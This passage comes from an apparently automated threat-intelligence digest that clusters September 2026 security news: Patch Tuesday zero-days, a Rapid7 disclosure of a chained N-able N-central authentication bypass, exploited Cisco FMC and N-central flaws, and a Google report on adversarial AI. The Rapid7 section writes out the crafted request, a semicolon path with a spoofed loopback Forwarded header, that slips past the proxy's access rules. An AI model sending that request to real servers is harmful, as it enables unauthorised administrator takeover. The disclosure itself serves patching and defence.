- cve_ids: CVE-2026-85880, CVE-2026-81963, CVE-2026-85046
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Microsoft is publishing 974 own-product vulnerabilities on September 2026 Patch Tuesday , including 723 vulnerabilities in Windows. Along with Microsoft fixes for 25 non-Microsoft CVEs, that brings the total number of vulnerabilities on the table today to 999. Whether this is the biggest Patch Tuesday ever depends on how we count, but this is by far the most CVEs that Microsoft has ever published in a single day. As Rapid7 noted last month, there is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for two of the vulnerabilities published today. Windows ALPC: zero-day EoP The eternal game of elevation of privilege whack-a-mole between Microsoft and attackers continues. This month, the battle is centered on the Windows Advanced Local Procedure Call (ALPC) mechanism, a kernel capability that facilitates inter-process communication. Microsoft is aware of exploitation in the wild already. Succe
```

#### Full body

```
Back to Blog Exposure Management Patch Tuesday - September 2026 Sep 8, 2026 | Last updated on Sep 8, 2026 | 122 min read Microsoft is publishing 974 own-product vulnerabilities on September 2026 Patch Tuesday , including 723 vulnerabilities in Windows. Along with Microsoft fixes for 25 non-Microsoft CVEs, that brings the total number of vulnerabilities on the table today to 999. Whether this is the biggest Patch Tuesday ever depends on how we count, but this is by far the most CVEs that Microsoft has ever published in a single day. As Rapid7 noted last month, there is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for two of the vulnerabilities published today. Windows ALPC: zero-day EoP The eternal game of elevation of privilege whack-a-mole between Microsoft and attackers continues. This month, the battle is centered on the Windows Advanced Local Procedure Call (ALPC) mechanism, a kernel capability that facilitates inter-process communication. Microsoft is aware of exploitation in the wild already. Successful abuse of the flaw underlying CVE-2026-85880 grants an attacker SYSTEM via a buffer overflow that enables an out-of-bounds write, and as we all know by now, this is exactly what would happen during the first five minutes of a technically accurate horror movie about ransomware. We can infer one silver lining here: since neither Server 2025 nor Windows 11 receives patches for CVE-2026-85880, it is likely that Microsoft’s ongoing efforts to level up memory safety by rewriting critical kernel components in Rust are paying off. Windows Update Stack: zero-day EoP Attackers disappointed by Microsoft’s move towards memory safety improvements for various critical kernel components need not leave empty-handed today. Microsoft is aware of existing exploitation in the wild for CVE-2026-81963 , an elevation of privilege vulnerability in the Windows Update Stack that leads to SYSTEM privileges via improper link resolution. All supported versions of Windows receive a patch, which presumably tightens up controls to prevent the Windows Update Stack from following a malicious link and overwriting a system component with an attacker-controlled imposter. The relatively pedestrian CVSS v3 base score of 7.8 is no reason for less concern, since no serious attacker will bother developing an intricate one-shot RCE when a two-stage attack chain consisting of low-privileged local access coupled with elevation of privilege will achieve the same ultimate goal much more easily. Living on the Edge: browser advisory uncertainty For the second month in a row, Microsoft does not appear to have published any desktop browser security advisories between the start of the month and Patch Tuesday. Microsoft Edge is built on top of Google’s open-source Chromium project, and on September 3, 2026, Google Chrome patched CVE-2026-85046, an exploited-in-the-wild zero-day vulnerability in the V8 JavaScript engine relied upon by both Edge and Chrome. So, is Microsoft Edge falling dangerously behind Google Chrome? Well, maybe. In this specific case, the Edge stable channel did receive a patch a day earlier than Chrome on September 2, 2026, and we know this because the Edge release notes mention it . However, almost a week later, Microsoft still hasn’t published a security advisory for CVE-2026-85046 , and until that URL returns something better than a 404, that will remain true. In short: if you’re patched, you are protected, but if you rely on advisories to know which vulns exist, you could miss this zero-day vulnerability altogether. Only Microsoft knows why this advisory is missing, but there is no reason to suppose that Microsoft is somehow immune to the pressures that come along with the vast increase in vulnerability volume. A patch without an advisory is perhaps marginally better than an advisory without a patch, but keeping track of exposures without reliable adv
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Patch Tuesday - September 2026
  - Published: 2026-09-08T21:44:04+00:00
  - Link: https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
  - Summary: Microsoft is publishing 974 own-product vulnerabilities on September 2026 Patch Tuesday , including 723 vulnerabilities in Windows. Along with Microsoft fixes for 25 non-Microsoft CVEs, that brings the total number of vulnerabilities on the table today to 999. Whether this is the biggest Patch Tuesday ever depends on how we count, but this is by far the most CVEs that Microsoft has ever published in a single day. As Rapid7 noted last month, there is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for two of the vulnerabilities published today. Windows ALPC: zero-day EoP The eternal game of elevation of privilege whack-a-mole between Microsoft and attackers continues. This month, the battle is centered on the Windows Advanced Local Procedure Call (ALPC) mechanism, a kernel capability that facilitates inter-process communication. Microsoft is aware of exploitation in the wild already. Succe

### Cluster 2a281139fe — score 31

- Title: CVE-2026-86206, CVE-2026-86207: N-able N-central Authentication Bypass (FIXED)
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-08T11:01:27+00:00
- Link: https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-18577, CVE-2026-86206, CVE-2026-86207

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- cve_ids: CVE-2026-18577, CVE-2026-86206, CVE-2026-86207
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-18577
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview While conducting research into a recent N-able N-central authentication bypass vulnerability ( CVE-2026-18577 ), Rapid7 Labs discovered two new vulnerabilities affecting the latest version of N-central. When chained together, these two vulnerabilities allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System administrator account on an affected server. CVE ID Description CWE CVSSv4 CVE-2026-86206 Semicolon/Forwarded access-control bypass CWE-791 6.9 (Medium) CVE-2026-86207 UserTwoFactorLogin authentication bypass CWE-305 7.7 (High) Both CVE-2026-86206 and CVE-2026-86207 have been patched by the vendor via N-central 2026.3 Hotfix 3. Product description N-able N-central is an enterprise-grade Remote Monitoring and Management (RMM) platform designed for Managed Service Providers (MSPs) and IT departments to monitor, manage, and secure complex, large-scale networks from a centralized dashboard. Credit These vulnerabilities were di
```

#### Full body

```
Back to Blog Vulnerabilities and Exploits CVE-2026-86206, CVE-2026-86207: N-able N-central Authentication Bypass (FIXED) Stephen Fewer Sep 8, 2026 | Last updated on Sep 8, 2026 | 9 min read Overview While conducting research into a recent N-able N-central authentication bypass vulnerability ( CVE-2026-18577 ), Rapid7 Labs discovered two new vulnerabilities affecting the latest version of N-central. When chained together, these two vulnerabilities allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System administrator account on an affected server. CVE ID Description CWE CVSSv4 CVE-2026-86206 Semicolon/Forwarded access-control bypass CWE-791 6.9 (Medium) CVE-2026-86207 UserTwoFactorLogin authentication bypass CWE-305 7.7 (High) Both CVE-2026-86206 and CVE-2026-86207 have been patched by the vendor via N-central 2026.3 Hotfix 3. Product description N-able N-central is an enterprise-grade Remote Monitoring and Management (RMM) platform designed for Managed Service Providers (MSPs) and IT departments to monitor, manage, and secure complex, large-scale networks from a centralized dashboard. Credit These vulnerabilities were discovered by Stephen Fewer, Senior Principal Security Researcher at Rapid7 , and are being disclosed in accordance with Rapid7's vulnerability disclosure policy . Technical analysis CVE-2026-86206 N-central exposes its management interface (TCP 8443 by default) through Envoy , an edge proxy. Envoy passes accepted requests to Jetty , the Java web server that hosts N-central's application. The application gives requests from the loopback address (i.e. 127.0.0.1 ) more access than requests from a remote system. This design depends on Envoy, Jetty, and the N-central access filter all agreeing on which application path the client requested and whether the client is really local. The following request can make them disagree about both of these things: POST /dms;/services/ServerUI HTTP/1.1 Forwarded: for="127.0.0.\1" Content-Type: text/xml; charset=utf-8 SOAPAction: "" The semicolon in the URI and backslash in the Forwarded value introduce a discrepancy when processing the request that leads to an access control bypass. Looking at Figure 1 below, we can see an overview of how these two values are processed during an incoming malicious request. Figure 1: Processing a malicious request. The semicolon gets the request past Envoy The Envoy proxy rules come from the n-central-proxy-4.5.6-5 package. In /etc/opt/envoy/lds_intermediate.yaml , shown below (and edited for brevity), the management listener returns HTTP 403 for paths beginning with /dms/services or /internal/dms . A final catch-all rule sends other paths to the DMS application. # /etc/opt/envoy/lds_intermediate.yaml:953 - match: prefix: /internal/dms # response-header boilerplate omitted direct_response: status: 403 body: inline_string: Forbidden. No API access on the UI port. # ... - match: prefix: /dms/services # response-header boilerplate omitted direct_response: status: 403 body: inline_string: Forbidden. No API access on the UI port. # ... # /etc/opt/envoy/lds_intermediate.yaml:1301 # A final catch-all rule... - match: prefix: / route: cluster: dms timeout: seconds: 300 Envoy compares those prefixes with the path it received. The path /dms;/services/ServerUI does not begin with /dms/services , because the next character after /dms is a semicolon. It therefore reaches the catch-all route, passing the request from Envoy to Jetty. Jetty interprets the path differently. The shipped jetty-http-9.4.56.v20240826.jar contains org.eclipse.jetty.http.HttpURI , and org.eclipse.jetty.util.URIUtil . Together, these classes treat text beginning with a semicolon as a path parameter and remove it when producing the decoded path used for servlet dispatch. As a result, Jetty turns /dms;/services/ServerUI into /dms/services/ServerUI . That decoded path then matches the Axis SOAP servlet mapping in /opt/nable/webapps/ROOT/WEB-
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-86206, CVE-2026-86207: N-able N-central Authentication Bypass (FIXED)
  - Published: 2026-09-08T11:01:27+00:00
  - Link: https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
  - Summary: Overview While conducting research into a recent N-able N-central authentication bypass vulnerability ( CVE-2026-18577 ), Rapid7 Labs discovered two new vulnerabilities affecting the latest version of N-central. When chained together, these two vulnerabilities allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System administrator account on an affected server. CVE ID Description CWE CVSSv4 CVE-2026-86206 Semicolon/Forwarded access-control bypass CWE-791 6.9 (Medium) CVE-2026-86207 UserTwoFactorLogin authentication bypass CWE-305 7.7 (High) Both CVE-2026-86206 and CVE-2026-86207 have been patched by the vendor via N-central 2026.3 Hotfix 3. Product description N-able N-central is an enterprise-grade Remote Monitoring and Management (RMM) platform designed for Managed Service Providers (MSPs) and IT departments to monitor, manage, and secure complex, large-scale networks from a centralized dashboard. Credit These vulnerabilities were di

### Cluster ebddae999f — score 27

- Title: Cisco confirms CVE-2026-20079 Secure FMC flaw exploited in attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-09T21:40:44+00:00
- Link: https://www.bleepingcomputer.com/news/security/cisco-confirms-cve-2026-20079-secure-fmc-flaw-exploited-in-attacks/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-20079

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, ransomware_extortion, vulnerability_disclosure
- affected_industries: government
- affected_products: Cisco, Fortinet
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: Cisco
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Cisco has confirmed that a maximum-severity authentication bypass vulnerability tracked as CVE-2026-20079 in its Secure Firewall Management Center (FMC) software is being actively exploited in attacks. [...]
```

#### Full body

```
Cisco confirms CVE-2026-20079 Secure FMC flaw exploited in attacks By Lawrence Abrams September 9, 2026 05:40 PM 0 Cisco has confirmed that a maximum-severity authentication bypass vulnerability tracked as CVE-2026-20079 in its Secure Firewall Management Center (FMC) software is being actively exploited in attacks. The vulnerability has a maximum CVSS score of 10.0 and allows unauthenticated, remote attackers to bypass authentication and execute scripts and commands as root on vulnerable devices. "In August 2026, the Cisco PSIRT became aware of active exploitation of this vulnerability," Cisco updated its CVE-2026-20079 advisory to say on Wednesday. Cisco did not disclose when the attacks began, who was behind them, or what post-exploitation activity was observed. Cisco first disclosed CVE-2026-20079 in March , when the company said it had no evidence that the vulnerability was being exploited in attacks. The flaw is caused by an improper system process created at boot time and can be exploited by sending crafted HTTP requests to the web interface of an affected device. A successful attack can allow an unauthenticated attacker to execute scripts and commands on the device with root privileges. The vulnerability affects Cisco Secure FMC Software and Cisco Security Cloud Control Firewall Management. Cisco says it has already patched the cloud-hosted Security Cloud Control service. Cisco says there are no workarounds and recommends that customers upgrade to the latest software release. Today, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-20079 to its Known Exploited Vulnerabilities (KEV) catalog, ordering Federal Civilian Executive Branch agencies to secure vulnerable systems by September 12, 2026. Evidence of exploitation appeared in July While Cisco says its security team became aware of active exploitation of CVE-2026-20079 in August, IOCs published in a July advisory update suggest the flaw may have been exploited earlier. On July 29, Cisco disclosed another Secure FMC vulnerability , tracked as CVE-2026-20316, caused by static credentials for a low-privileged account. Cisco said at the time that CVE-2026-20316 had been actively exploited in attacks and assigned it a High severity rating because the access could be combined with other Secure FMC vulnerabilities to elevate privileges. As BleepingComputer reported at the time , Cisco also updated the CVE-2026-20079 advisory to include the same indicators as CVE-2026-20316, but did not confirm the flaw was exploited. Cisco told administrators to search /var/log/messages for activity related to /var/tmp/license.tmp and shared the following example log entry: Jul 23 16:16:33 firepower sudo: www : PWD=/ ; USER=root ; COMMAND=/usr/local/sf/bin/package_info.pl /var/tmp/license.tmp --lsm Cisco says that if this entry is found, the vulnerability "may have been exploited" on the examined Secure FMC device. The example log entry is dated July 23, weeks before Cisco says PSIRT became aware of exploitation of CVE-2026-20079 in August. Cisco also released the same Secure FMC hot fixes for both CVE-2026-20316 and CVE-2026-20079. At the time, BleepingComputer contacted Cisco to ask whether the two vulnerabilities were connected, whether CVE-2026-20079 had also been exploited, and whether Cisco intentionally added the shared indicator to both advisories. Cisco did not answer the questions directly and instead shared the following statement: "On July 29, 2026, Cisco released software fixes to address vulnerabilities in Cisco Secure Firewall Management Center (FMC). Details are outlined in the security advisories (Static Credential vulnerability, Authentication Bypass vulnerability), and Cisco strongly recommends customers immediately apply the available fixes," a Cisco spokesperson told BleepingComputer. "Customers needing support should contact the Cisco Technical Assistance Center (TAC)." Cisco's latest update now confirms that CVE-2026-20079 has been exploit
```

#### Corroborating sources (4)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Cisco confirms CVE-2026-20079 Secure FMC flaw exploited in attacks
  - Published: 2026-09-09T21:40:44+00:00
  - Link: https://www.bleepingcomputer.com/news/security/cisco-confirms-cve-2026-20079-secure-fmc-flaw-exploited-in-attacks/
  - Summary: Cisco has confirmed that a maximum-severity authentication bypass vulnerability tracked as CVE-2026-20079 in its Secure Firewall Management Center (FMC) software is being actively exploited in attacks. [...]
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Cisco FMC bugs exploited by nation-state and ransomware actors (CVE-2026-20079, CVE-2026-20316)
  - Published: 2026-09-10T11:22:38+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/10/cisco-fmc-exploited-cve-2026-20079-cve-2026-20316/
  - Summary: State-sponsored and financially-motivated attackers are actively exploiting CVE-2026-20079, a critical authentication bypass vulnerability in Cisco Secure Firewall Management Center (FMC), which is used for centrally managing multiple Cisco Secure Firewall devices across a network. Two FMC vulnerabilities under active attack “Cisco Talos is actively tracking the exploitation of two vulnerabilities in Cisco’s Secure Firewall Management Center (FMC) Software,” the company’s researchers confirmed on Wednesday. These are the above mentioned CVE-2026-20079 and CVE-2026-20316, which Cisco flagged … More → The post Cisco FMC bugs exploited by nation-state and ransomware actors (CVE-2026-20079, CVE-2026-20316) appeared first on Help Net Security .
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Organizations Warned of Cisco Secure FMC Exploitation
  - Published: 2026-09-10T10:06:20+00:00
  - Link: https://www.securityweek.com/organizations-warned-of-cisco-secure-fmc-exploitation/
  - Summary: Cisco and CISA have flagged exploitation of CVE-2026-20079, a vulnerability disclosed in March 2026. The post Organizations Warned of Cisco Secure FMC Exploitation appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: CISA Flags Exploited Cisco, Citrix, Fortinet Flaws, Sets Sept. 12 Federal Patch Deadline
  - Published: 2026-09-10T10:36:46+00:00
  - Link: https://thehackernews.com/2026/09/cisa-flags-exploited-cisco-citrix.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added three flaws, each impacting Cisco, Citrix, and Fortinet, to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 12, 2026. The vulnerabilities are listed below - CVE-2026-20079 (CVSS score: 10.0) - An authentication

### Cluster dca90fcb42 — score 27

- Title: N-able N-central Pre-Auth RCE Flaw Exploited in the Wild
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T04:27:51+00:00
- Link: https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-86218

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, supply_chain
- affected_industries: government
- cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a maximum-severity security flaw impacting N-able N-central to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. The vulnerability in question is CVE-2026-86218 (CVSS score: 10.0), which has been described as a
```

#### Full body

```
N-able N-central Pre-Auth RCE Flaw Exploited in the Wild  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Code Injection The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a maximum-severity security flaw impacting N-able N-central to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. The vulnerability in question is CVE-2026-86218 (CVSS score: 10.0), which has been described as a case of static code injection. It has been patched in N-central 2026.3 Hotfix 4 , released on September 5, 2026. "N-able N-central contains a static code injection vulnerability that could allow for pre-authentication remote code execution," CISA said. The development came shortly after Huntress said it commenced an investigation following the compromise of a customer's fully patched N-central production environment on September 4, 2026. However, it remains unclear if the intrusion involved CVE-2026-86218 or two other vulnerabilities ( CVE-2026-86206 and CVE-2026-86207 ) that were patched by N-able the same day with N-central 2026.3 Hotfix 3. CVE-2026-86206 and CVE-2026-86207 can be chained together to allow a remote unauthenticated attacker to bypass authentication and create a new attacker-controlled System Administrator account on an affected server, per Rapid7's Stephen Fewer , who discovered and reported them. "Due to limited historical logging available directly on the appliance, we cannot definitively confirm which specific exploit the threat actor used to achieve their compromise, nor can we rule out the use of alternative vulnerabilities," Huntress noted . In a separate "urgent" notice sent directly to customers, N-able said CVE-2026-86218 "has been observed being exploited in the wild" and that it's "actively investigating this matter and have taken additional steps to help protect customer environments." It also urged customers to apply the hotfix immediately. Preemptive exposure management firm watchTowr said it has successfully reproduced CVE-2026-86218, adding that the pre-authentication vulnerability enables remote code execution and allows attackers to make changes in N-central that can propagate across all connected systems. "This is precisely why N-central is so strategically valuable to threat actors, especially ransomware gangs," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said. "The product is widely used by MSPs, MSSPs, and large IT organizations to manage entire customer and corporate environments. Compromise N-central, and you gain access to all connected computers and downstream systems. Based on historical events, AI-enabled attackers are unlikely to be far behind." "Organizations running internet-facing N-central instances should prioritize upgrading to a patched release. However, as is now quickly becoming the new normal, patching alone is not enough. Organizations must also review their environment for indicators of compromise and anomalous activity that suggest the vulnerability has already been exploited before patching. Ransomware threat actors have historically exploited this product in past campaigns, and this vulnerability is as severe as it gets." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , Code Injection , N-able , remote code execution , Vulnerability ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: N-able N-central Pre-Auth RCE Flaw Exploited in the Wild
  - Published: 2026-09-09T04:27:51+00:00
  - Link: https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a maximum-severity security flaw impacting N-able N-central to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. The vulnerability in question is CVE-2026-86218 (CVSS score: 10.0), which has been described as a
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: N-able Releases Hotfix for Critical Remote Code Execution Vulnerability
  - Published: 2026-09-07T12:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - Summary: The vulnerability, CVE-2026-86218, was allocated a maximum-severity rating by the software provider itself

### Cluster 486bdc7094 — score 27

- Title: GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-09-08T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/from-prompting-to-autonomy-the-evolution-of-adversarial-ai/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: UNC6780

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng, ransomware_extortion, supply_chain
- actor_attribution: UNC6780
- affected_industries: government, healthcare
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, apt_espionage, active_exploitation
- actor_attribution: UNC6780
- affected_industries: healthcare, government
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and c
```

#### Full body

```
Threat Intelligence GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI September 8, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and co-opt victim cloud environments to sustain unauthorized AI workloads. This shift underscores that enterprise AI assets—from model weights to cloud compute quotas—are high-value targets for espionage, extortion, and resource theft. Key Q2 2026 trends include: Expanding Software Supply Chain Risks: The integration of AI-assisted coding tools and open source software has accelerated software development cycles but also increased operational risks, with threat actors actively targeting developers, AI coding assistants, and LLM security scanning tools. Targeting Proprietary AI IP: GTIG observed increasing instances of adversaries targeting proprietary AI models, code, prompts, and research across sectors including healthcare, government, and media. Shift Toward Agentic AI and Automation: Adversaries are deploying multi-agent frameworks that autonomously manage scanning pipelines, resolve operational errors, and execute credential harvesting at scale. Multi-Stage Lifecycle Augmentation: State-sponsored and cyber crime groups continue to use AI capabilities as force multipliers across the attack lifecycle—from target reconnaissance and social engineering lure creation to custom malware obfuscation and post-exploitation troubleshooting. They are also experimenting with scaling information operations (IO) campaigns. Illicit Account Procurement & LLMJacking: To circumvent access costs, adversaries are stealing developer credentials, purchasing compromised AI platform accounts, and hijacking enterprise cloud infrastructure to run unauthorized high-performance compute workloads. Grounded in telemetry from frontline Mandiant incident response engagements, global threat actor tracking, and live platform defenses, this report details how state-sponsored espionage groups, financially motivated cyber criminals, and information operations (IO) threat actors are operationalizing AI tools in the wild. At Google, we are committed to developing AI boldly and responsibly. Our multifaceted defense strategy integrates proactive model-level safeguards, specialized threat intelligence, and targeted containment protocols to protect our customers and infrastructure. We continuously harden our models against misuse, mitigate malicious activity through proactive disruption of bad actor projects and accounts, and use our autonomous Google AI Threat Defense architecture to operationalize security across enterprise environments. AI-assisted coding pipelines increase open source supply chain risk As discussed in our May report , with organizations continuing to integrate various types of LLMs into production environments, the AI software ecosystem has become a primary target for exploitation. AI-assisted coding has led to
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI
  - Published: 2026-09-08T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/from-prompting-to-autonomy-the-evolution-of-adversarial-ai/
  - Summary: Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and c
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: GTIG AI Threat Tracker: From Prompting to Autonomy – The Evolution of Adversarial AI
  - Published: 2026-09-08T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/from-prompting-to-autonomy-the-evolution-of-adversarial-ai/
  - Summary: Executive Summary Since the release of our May 2026 report detailing adversarial misuse of artificial intelligence (AI), Google Threat Intelligence Group (GTIG) has observed forward leaning adversaries transition from basic prompting to agentic AI workflows and AI-enabled automation. In these operations, human-in-the-loop latency is dramatically reduced, compressing the traditional window for defenders to respond. In Q2 2026, GTIG observed threat actors compromise a cloud resource, then plan, build, and execute an agent-enabled mass credential harvesting campaign in under six hours. We also tracked UNC6780 using multiple tactics to trick AI coding assistants and large language model (LLM) security scanners into its open source software supply chain compromises. Threat actors are also increasingly targeting AI assets. GTIG observed adversaries with wide-ranging motivations target proprietary AI models and source code, exfiltrate application programming interface (API) credentials, and c

### Cluster d3ed2ddfb7 — score 26

- Title: Critical NetScaler Vulnerability Exploited in Attacks
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-10T12:20:21+00:00
- Link: https://www.securityweek.com/critical-netscaler-vulnerability-exploited-in-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-19490

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, zero_day
- affected_industries: government, manufacturing_industrial
- affected_products: Android, Fortinet, Ivanti
- cve_ids: CVE-2026-19490
- urgency_signals: actively_exploited, poc_available, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, data_breach, active_exploitation
- affected_industries: government, manufacturing_industrial
- affected_products: Fortinet, Ivanti, Android
- cve_ids: CVE-2026-19490
- urgency_signals: actively_exploited, zero_day, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Tracked as CVE-2026-19490, the authentication bypass flaw has been exploited in the wild since at least September 3. The post Critical NetScaler Vulnerability Exploited in Attacks appeared first on SecurityWeek .
```

#### Full body

```
